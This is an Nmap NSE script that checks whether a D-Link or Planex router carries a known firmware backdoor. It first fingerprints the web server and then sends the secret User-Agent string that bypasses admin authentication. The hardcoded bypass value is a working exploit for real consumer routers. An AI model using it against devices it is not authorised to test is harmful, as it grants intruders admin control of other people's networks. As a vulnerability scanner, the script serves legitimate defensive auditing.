description = [[
Detects a firmware backdoor on some D-Link routers by changing the User-Agent
to a "secret" value. Using the "secret" User-Agent bypasses authentication
and allows admin access to the router.

The following router models are likely to be vulnerable: DIR-100, DIR-120,
DI-624S, DI-524UP, DI-604S, DI-604UP, DI-604+, TM-G5240

In addition, several Planex routers also appear to use the same firmware:
BRL-04UR, BRL-04CW

Reference: http://www.devttys0.com/2013/10/reverse-engineering-a-d-link-backdoor/
]]

---
-- @usage
-- nmap -sV --script http-dlink-backdoor <target>
--
-- @output
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http    syn-ack
-- | http-dlink-backdoor:
-- |   VULNERABLE:
-- |   Firmware backdoor in some models of D-Link routers allow for admin password bypass
-- |     State: VULNERABLE
-- |     Risk factor: High
-- |     Description:
-- |       D-Link routers have been found with a firmware backdoor allowing for admin password bypass using a "secret" User-Agent string.
-- |
-- |     References:
-- |_      http://www.devttys0.com/2013/10/reverse-engineering-a-d-link-backdoor/
---

author = "Patrik Karlsson <patrik@cqure.net>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit","vuln"}

local http = require "http"
local shortport = require "shortport"
local string = require "string"
local vulns = require "vulns"

portrule = shortport.http

action = function(host, port)
  local response = http.get(host, port, "/", { redirect_ok = false, no_cache = true })
  local server = response.header and response.header['server'] or ""
  local vuln_table = {
    title = "Firmware backdoor in some models of D-Link routers allow for admin password bypass",
    state = vulns.STATE.NOT_VULN,
    risk_factor = "High",
    description = [[
D-Link routers have been found with a firmware backdoor allowing for admin password bypass using a "secret" User-Agent string.
]],
    references = {
      'http://www.devttys0.com/2013/10/reverse-engineering-a-d-link-backdoor/',
    }
  }
  if ( response.status == 401 and server:match("^thttpd%-alphanetworks") ) or
    ( response.status == 302 and server:match("^Alpha_webserv") ) then
    response = http.get(host, port, "/", { header = { ["User-Agent"] = "xmlset_roodkcableoj28840ybtide" } })

    if ( response.status == 200 ) then
      vuln_table.state = vulns.STATE.VULN
      local report = vulns.Report:new(SCRIPT_NAME, host, port)
      return report:make_output(vuln_table)
    end
  end
  return
end
